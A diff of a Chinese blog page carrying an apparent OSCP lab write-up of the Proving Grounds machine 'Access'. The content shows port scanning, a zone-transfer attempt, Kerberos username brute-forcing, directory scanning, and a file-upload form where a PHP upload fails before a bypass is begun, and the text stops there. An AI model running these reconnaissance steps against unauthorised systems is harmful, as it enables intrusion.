@@ -6,24 +6,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
     <meta name="robots" content="noodp" />
     <title>ProvingGrounds Access Writeup - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
-<meta name="author-link" content="">
-<meta name="description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access IP：192.168.xx.187 Port 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16" /><meta name="keywords" content='OSCP, PG_Practice' /><meta itemprop="name" content="ProvingGrounds Access Writeup">
-<meta itemprop="description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access IP：192.168.xx.187 Port 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16"><meta itemprop="datePublished" content="2024-01-12T06:17:36+00:00" />
-<meta itemprop="dateModified" content="2024-01-12T06:17:36+00:00" />
-<meta itemprop="wordCount" content="2866">
-<meta itemprop="keywords" content="OSCP,PG_Practice," /><meta property="og:title" content="ProvingGrounds Access Writeup" />
-<meta property="og:description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access IP：192.168.xx.187 Port 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://www.bthoughts.top/posts/provinggrounds-access/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2024-01-12T06:17:36+00:00" />
-<meta property="article:modified_time" content="2024-01-12T06:17:36+00:00" />
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="ProvingGrounds Access Writeup"/>
-<meta name="twitter:description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access IP：192.168.xx.187 Port 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16"/>
+<meta name="description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access
+"><meta name="keywords" content='OSCP, PG_Practice'>
+  <meta itemprop="name" content="ProvingGrounds Access Writeup">
+  <meta itemprop="description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access">
+  <meta itemprop="datePublished" content="2024-01-12T06:17:36+00:00">
+  <meta itemprop="dateModified" content="2024-01-12T06:17:36+00:00">
+  <meta itemprop="wordCount" content="2866">
+  <meta itemprop="keywords" content="OSCP,PG_Practice"><meta property="og:url" content="https://www.bthoughts.top/posts/provinggrounds-access/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="ProvingGrounds Access Writeup">
+  <meta property="og:description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-01-12T06:17:36+00:00">
+    <meta property="article:modified_time" content="2024-01-12T06:17:36+00:00">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="PG_Practice">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ProvingGrounds Access Writeup">
+  <meta name="twitter:description" content="Access 第14台，Windows系统，难度中等Intermediate，名称 Access">
 <meta name="application-name" content="Xavier&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://www.bthoughts.top/posts/provinggrounds-access/" /><link rel="prev" href="https://www.bthoughts.top/posts/provinggrouds_surf_writeup/" /><link rel="next" href="https://www.bthoughts.top/posts/provinggrounds-heist/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://www.bthoughts.top/posts/provinggrounds-access/" title="ProvingGrounds Access Writeup - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="https://www.bthoughts.top/posts/provinggrouds_surf_writeup/" title="ProvingGrouds Surf WriteUp" /><link rel="next" type="text/html" href="https://www.bthoughts.top/posts/provinggrounds-heist/" title="ProvingGrounds Heist Writeup" /><link rel="alternate" type="text/markdown" href="https://www.bthoughts.top/posts/provinggrounds-access/index.md" title="ProvingGrounds Access Writeup - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
   {
     "@context": "http://schema.org",
     "@type": "BlogPosting",
@@ -40,49 +50,19 @@
         "name": "Xavier"
       },"description": ""
   }
-  </script></head>
-  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
   <div class="header-wrapper">
     <div class="header-title">
       <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
     <nav>
       <ul class="menu"><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/posts/"
-                
-                
-              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/categories/"
-                
-                
-              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/tags/"
-                
-                
-              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/friends/"
-                
-                
-              ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/tools/"
-                
-                
-              ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
-              <a
-                class="menu-link"
-                href="/about/"
-                
-                
-              ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
             <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
             <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
               <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
@@ -95,8 +75,7 @@
             </span>
           </li><li class="menu-item theme-switch" title="切换主题">
           <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-        </li>
-      </ul>
+        </li></ul>
     </nav>
   </div>
 </header><header class="mobile animate__faster" id="header-mobile">
@@ -125,51 +104,9 @@
             <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
               取消
             </a>
-          </li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/posts/"
-                  
-                  
-                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/categories/"
-                  
-                  
-                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/tags/"
-                  
-                  
-                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/friends/"
-                  
-                  
-                ><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/tools/"
-                  
-                  
-                ><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li
-              class="menu-item"
-            ><a
-                  class="menu-link"
-                  href="/about/"
-                  
-                  
-                ><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item theme-switch" title="切换主题">
-          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
-        </li></ul>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
     </nav>
   </div>
 </header><div class="search-dropdown desktop">
@@ -177,19 +114,13 @@
   </div>
   <div class="search-dropdown mobile">
     <div id="search-dropdown-mobile"></div>
-  </div><main class="container" data-page-style="normal"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
-      <div class="toc-content always-active" id="toc-content-auto"></div></aside>
-
-  <aside class="aside-custom">
-    </aside>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
 
   <article class="page single">
-    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
-        <span>ProvingGrounds Access Writeup</span>
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>ProvingGrounds Access Writeup</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
-          <span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div>
-      <div class="post-meta-line"><span title=2024-01-12&#32;06:17:36><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-01-12">2024-01-12</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 2866 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 6 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category" title="分类 - 靶场"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div><div class="post-meta-line"><span title="发布于 2024-01-12 06:17:36"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-01-12">2024-01-12</time></span>&nbsp;<span title="2866 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 2900 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 6 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="ProvingGrounds Access Writeup"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+          </span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -217,11 +148,17 @@
     <li><a href="#prive-1">PrivE</a></li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="access">Access</h2>
-<p>第14台，Windows系统，难度中等Intermediate，名称 Access</p>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="access" class="heading-element"><span>Access</span>
+  <a href="#access" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>第14台，Windows系统，难度中等Intermediate，名称 Access</p>
 <p>IP：192.168.xx.187</p>
-<h2 id="port">Port</h2>
-<div class="highlight"><div class="chroma">
+<h2 id="port" class="heading-element"><span>Port</span>
+  <a href="#port" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -272,12 +209,17 @@
 </span></span><span class="line"><span class="cl">Service Info: Host: SERVER<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 18.97 seconds
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 18.97 seconds</span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="init-access">Init Access</h2>
-<h3 id="53-dns">53-DNS</h3>
-<p>域传送失败</p>
+</div><h2 id="init-access" class="heading-element"><span>Init Access</span>
+  <a href="#init-access" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 id="53-dns" class="heading-element"><span>53-DNS</span>
+  <a href="#53-dns" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>域传送失败</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -307,11 +249,13 @@
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span>  
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying NS server 192.168.167.187
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 192.168.167.187 Has port <span class="m">53</span> TCP Open
-</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Zone Transfer Failed <span class="o">(</span>Zone transfer error: REFUSED<span class="o">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Zone Transfer Failed <span class="o">(</span>Zone transfer error: REFUSED<span class="o">)</span></span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="88-kerberos">88-Kerberos</h3>
-<p>域用户爆破</p>
+</div><h3 id="88-kerberos" class="heading-element"><span>88-Kerberos</span>
+  <a href="#88-kerberos" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>域用户爆破</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -319,12 +263,14 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ sudo nmap -p <span class="m">88</span> --script<span class="o">=</span>krb5-enum-users --script-args krb5-enum-users.realm<span class="o">=</span><span class="s2">&#34;access.offsec&#34;</span>,userdb<span class="o">=</span><span class="s2">&#34;/usr/share/wordlists/seclists/Usernames/Names/names.txt&#34;</span> 192.168.167.187
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -p <span class="m">88</span> --script<span class="o">=</span>krb5-enum-users --script-args krb5-enum-users.realm<span class="o">=</span><span class="s2">&#34;access.offsec&#34;</span>,userdb<span class="o">=</span><span class="s2">&#34;/usr/share/wordlists/seclists/Usernames/Names/names.txt&#34;</span> 192.168.167.187</span></span></code></pre></td></tr></table>
 </div>
 </div><p>无成果</p>
-<h3 id="80-http">80-http</h3>
-<p>Web扫描</p>
+<h3 id="80-http" class="heading-element"><span>80-http</span>
+  <a href="#80-http" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Web扫描</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -338,8 +284,7 @@
 </span></span><span class="line"><span class="cl">└─$ dirsearch -x 400,403,404  -t <span class="m">500</span> -e php,ini,txt,bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://192.168.167.187
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/Access<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└─$ dirsearch -x 400,404  -t <span class="m">500</span> -e php,ini,txt,bak -u http://192.168.167.187 
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">└─$ dirsearch -x 400,404  -t <span class="m">500</span> -e php,ini,txt,bak -u http://192.168.167.187 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>发下如下：</p>
 <div class="highlight"><div class="chroma">
@@ -347,13 +292,12 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.167.187/cgi-bin/printenv.pl		# 系统环境信息
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.167.187/cgi-bin/printenv.pl		# 系统环境信息</span></span></code></pre></td></tr></table>
 </div>
 </div><p>对Web页面进行信息搜集，发现一个文件上传功能点</p>
-<p><img loading="lazy" src="resource/14-W-M-Access.assets/image-20240112003429974.png" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003429974.png, resource/14-W-M-Access.assets/image-20240112003429974.png 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003429974.png 2x" sizes="auto" data-title="image-20240112003429974" data-alt="image-20240112003429974" width="2322" height="1542" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003429974.png" alt="image-20240112003429974" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003429974.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003429974.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003429974.png?size=large 2x" data-title="image-20240112003429974" style="--width: 2322px;--aspect-ratio: 2322 / 1542;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>尝试上传PHP文件失败</p>
-<p><img loading="lazy" src="resource/14-W-M-Access.assets/image-20240112003633057.png" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003633057.png, resource/14-W-M-Access.assets/image-20240112003633057.png 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003633057.png 2x" sizes="auto" data-title="image-20240112003633057" data-alt="image-20240112003633057" width="2520" height="1396" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003633057.png" alt="image-20240112003633057" srcset="/posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003633057.png?size=small, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003633057.png?size=medium 1.5x, /posts/provinggrounds-access/resource/14-W-M-Access.assets/image-20240112003633057.png?size=large 2x" data-title="image-20240112003633057" style="--width: 2520px;--aspect-ratio: 2520 / 1396;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>尝试绕过</p>
 <p>Web扫描时发现有</p>
